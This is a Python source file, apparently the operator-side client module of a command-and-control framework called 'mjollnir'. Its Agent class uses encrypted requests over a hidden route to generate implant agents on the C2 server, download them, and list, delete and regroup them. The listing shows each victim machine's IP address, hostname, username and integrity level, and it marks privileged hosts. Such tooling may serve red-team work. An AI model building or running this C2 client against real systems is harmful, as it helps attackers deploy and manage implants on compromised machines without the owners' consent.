
import json
import misc
import termtables as tt

class Agent():
	def __init__(self, config, session, misc):
		self.config = config
		self.s = session
		self.misc = misc

	def generate_agent(self, agent_name, agent_param):
		# POST mjollnir/hidden_route/agent
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["agent"]
		data = agent_param
		data["agent_name"] = agent_name

		data = json.dumps(data)

		data = self.misc.encrypt(data)
		r = self.s.post(url+endpoint, data=data)
		if r.status_code == 200:
			print(self.misc.decrypt(r.content))
			return True
		else:
			print("[-] Cannot generate the agent")
			return False

	def download_agent(self, source, destination):
		r = self.s.get(source)
		if r.status_code == 200:
			try:
				open(destination, "wb").write(r.content)
				print("[+] Download of " + source + " into " + destination + " : OK")
				return True
			except Excption as e:
				print(str(e))
				print("[-] Cannot download " + source)
				return False
		else:
			print("[-] Cannot download " + source)
			return False

		

	def list_agents(self):
		# GET mjollnir/hidden_route/agents
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["agents"]
		r = self.s.get(url+endpoint)
		if r.status_code == 200:
			try:
				j = json.loads(self.misc.decrypt(r.content))
				#print(j)
				headers = ["", "uid", "name", "group", "type", 
							"os", "created at", "last check", 
							"ip address", "hostname", "username", 
							"integrity level", "version"]
				values = []
				for k in j.keys():
					row = j[k]
					if row[10] == "high": # Integrity Level -> append a * in the begining of the list
						row.insert(0,"*")
					else:
						row.insert(0,"")
					values.append(row)
				tt.print(values, header=headers)
			except Exception as e:
				print(str(e))
				print(self.misc.decrypt(r.content))	
		else:
			print("[-] Cannot list the agents")
			return False
			
		return True

	def delete_agent(self, agents_uid):
		# DELETE mjollnir/hidden_route/agent
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["agent"]
		for agent_uid in agents_uid:
			data = self.misc.encrypt(agent_uid)
			r = self.s.delete(url+endpoint, data=data)
			if r.status_code == 200:
				print(self.misc.decrypt(r.content))
			else:
				print("[-] Cannot delete the agent: " + agent_uid)
				
		return True

	def edit_agent_group(self, agent_uid, agent_group):
		# POST mjollnir/hidden_route/agent/agent_uid
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["agent"] + "/" + agent_uid
		data = {}
		data["agent_uid"] = agent_uid
		data["agent_group"] = agent_group

		data = json.dumps(data)

		data = self.misc.encrypt(data)
		r = self.s.post(url+endpoint, data=data)
		if r.status_code == 200:
			print(self.misc.decrypt(r.content))
			return True
		else:
			print("[-] Cannot edit the agent group: " + agent_uid)
			return False


	def info_agent(self, agent_uid):
		# GET mjollnir/hidden_route/agent/agent_uid
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["agent"]
		r = self.s.get(url+endpoint+"/"+agent_uid)
		if r.status_code == 200:
			try:
				j = json.loads(self.misc.decrypt(r.content))
				#print(j)
				headers = ["", "uid", "name", "group", "type", 
							"os", "created at", "last check", 
							"ip address", "hostname", "username", 
							"integrity level", "version"]
				values = []
				for k in j.keys():
					row = j[k]
					if row[10] == "high": # Integrity Level -> append a * in the begining of the list
						row.insert(0,"*")
					else:
						row.insert(0,"")
					values.append(row)
				tt.print(values, header=headers)
			except Exception as e:
				print(str(e))
				print(self.misc.decrypt(r.content))	
		else:
			print("[-] Cannot get info about the agent: " + agent_uid)
			return [[]]
		return values

	def get_agent_name(self, agent_uid):
		# GET mjollnir/hidden_route/agent/agent_uid
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["agent"]
		r = self.s.get(url+endpoint+"/"+agent_uid)
		if r.status_code == 200:
			try:
				j = json.loads(self.misc.decrypt(r.content))
				agent_name = j[agent_uid][1]
			except Exception as e:
				print(str(e))
				return ""
		else:
			print("[-] Cannot get the agent name of agent: " + agent_uid)
			return ""
		return agent_name

